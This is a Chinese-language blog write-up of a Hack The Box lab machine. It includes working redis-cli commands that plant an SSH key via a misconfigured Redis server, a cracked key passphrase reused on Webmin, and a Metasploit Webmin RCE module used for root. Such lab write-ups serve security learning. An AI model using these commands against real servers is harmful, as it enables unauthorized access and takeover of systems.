1. 第二台拿下root权限的机器, 虽然难度还是简单,但是很开心

    Happy Hacking!


    <!--more-->


    ## Foothold

    首先nmap扫描看一下

    ![nmap.jpg][1]

    看到开了三个端口22,80,1000

    这三个服务里第三个不太熟悉, 于是先访问看一下

    直接在浏览器里访问http://10.10.10.160:10000 会提示要求访问HTTPS

    访问https://10.10.10.160:10000

    看到是一个登录界面

    ![login.jpg][2]

    这个服务是一个webmin服务,于是自然的想用metasploit搜一下有没有相关的漏洞

    结果发现存在的漏洞大多需要用户名和密码

    有几个不需要的也利用不成功

    于是又试了一下爆破路径,结果也没发现什么有价值的东西

    

    只好求助论坛,发现论坛里面有人说需要全端口扫描,有人提示`r***s`

    猜测是redis的服务,于是扫一下6379端口发现确实有收获

    ![redis.jpg][3]

    但是实际上并没有用过redis,也不太了解相关的漏洞利用知识,于是搜了一下找到几个比较详细的文章

    [redis在渗透中getshell方法总结](https://zhuanlan.zhihu.com/p/36529010)

    [redis渗透测试技巧总结](http://www.am0s.com/penetration/215.html)

    [Redis Remote Command Execution](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)

    学习之后发现有一种写ssh 私钥的方法,进行尝试

    ```bash
    ssh-keygen -t rsa -C "xxx"
    (echo -e "\n\n";cat id_rsa.pub; echo -e "\n\n") > 1.txt
    redis-cli -h 10.10.10.160 flushall
    cat 1.txt | redis-cli -h 10.10.10.160 -x set crackit
    ```

    这边写进去之后用redis-cli连接,写一下dir和dbfilename两个字段的值

    ```bash
    redis-cli -h 10.10.10.160
    > CONFIG SET dir /var/lib/redis/.ssh/
    > CONFIG SET dbfilename "authorized_keys"
    > save
    ```

    写完之后连接先不要断,另开一个终端直接连过去

    ```bash
    ssh -i id_rsa redis@10.10.10.160
    ```

    连接成功,得到了redis权限

    

    ## Matt

    在redis权限下一番搜索查看

    发现在`/tmp`目录下有其他大佬上传的脚本,正好直接运行一下

    发现`/opt/id_rsa.bak`

    这个文件属于用户`Matt`

    于是吧这个私钥搞下来,结果发现是加密的

    用我们之前在[Traverxec](https://river-li.me/2019/12/03/htb-traverxec/#more)写的爆破脚本跑一下,得到key的密码`computer2008`

    之后尝试连接发现失败,解密后用key连接ssh也不行

    这时候想起webmin的登录界面,于是尝试用这个密码和用户名登录webmin

    ![webmin.jpg][4]

    结果居然登上了,这里就算是获取到了Matt的权限了

    

    ## root

    还记得之前用到的msf吗?

    既然已经有了一个Matt的用户名密码,就可以用msf里面的模块了

    用到一个`webmin_packageup_rce`的模块

    ![msfconsole.jpg][5]

    设置好参数直接run

    ![run.jpg][6]

    done!

    ## 总结

    这次机器学到的知识点

    1. webmin服务及相关的漏洞
    2. redis配置不当的几种渗透方法
    3. redis写shell的方法
    4. ssh key爆破密码的方法


    [1]: http://42.193.111.59/usr/uploads/2021/01/2090988332.jpg#vwid=834&vhei=366
    [2]: http://42.193.111.59/usr/uploads/2021/01/1766468089.jpg#vwid=1280&vhei=641
    [3]: http://42.193.111.59/usr/uploads/2021/01/3196586842.jpg#vwid=693&vhei=211
    [4]: http://42.193.111.59/usr/uploads/2021/01/3204943588.jpg#vwid=1280&vhei=417
    [5]: http://42.193.111.59/usr/uploads/2021/01/3405055908.jpg#vwid=1280&vhei=299
    [6]: http://42.193.111.59/usr/uploads/2021/01/2568944052.jpg#vwid=1280&vhei=483
